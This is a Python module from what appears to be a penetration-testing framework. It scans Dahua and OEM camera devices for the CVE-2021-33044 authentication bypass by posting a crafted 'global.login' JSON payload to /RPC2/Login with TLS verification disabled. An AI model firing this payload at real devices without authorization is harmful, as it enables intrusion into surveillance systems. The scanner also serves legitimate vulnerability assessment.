import httpx
from core.base import BaseModule

class Module(BaseModule):
    def __init__(self):
        super().__init__()
        self.name = "dahua/cve_2021_33044_scan"
        self.description = "Identity Authentication Bypass scanner for Dahua and OEM clones (CVE-2021-33044)."
        self.type = "scan"
        self.options = {
            "TARGET": {"required": True, "value": ""},
            "PORT": {"required": False, "value": "80"}
        }

    async def run(self):
        target = self.options["TARGET"]["value"]
        port = self.options["PORT"]["value"]
        
        if not target.startswith(("http://", "https://")):
            url = f"http://{target}:{port}/RPC2/Login"
        else:
            url = f"{target.rstrip('/')}/RPC2/Login"
            
        headers = {"Content-Type": "application/json"}
        
        # Ce payload tente d'initier une session d'authentification globale défectueuse
        payload = {
            "method": "global.login",
            "params": {
                "userName": "admin",
                "loginType": "Direct",
                "clientType": "Web3.0"
            },
            "id": 1
        }
        
        try:
            async with httpx.AsyncClient(timeout=6.0, verify=False) as client:
                response = await client.post(url, json=payload, headers=headers)
                # Si le serveur répond avec un jeton aléatoire (challenge) au lieu d'un rejet strict
                if response.status_code == 200 and "result" in response.text and "keepAliveInterval" in response.text:
                    return {
                        "vulnerable": True,
                        "details": "Dahua backend is highly vulnerable to identity bypass mechanics (CVE-2021-33044)."
                    }
        except Exception as e:
            return {"vulnerable": False, "error": str(e)}
        return {"vulnerable": False}
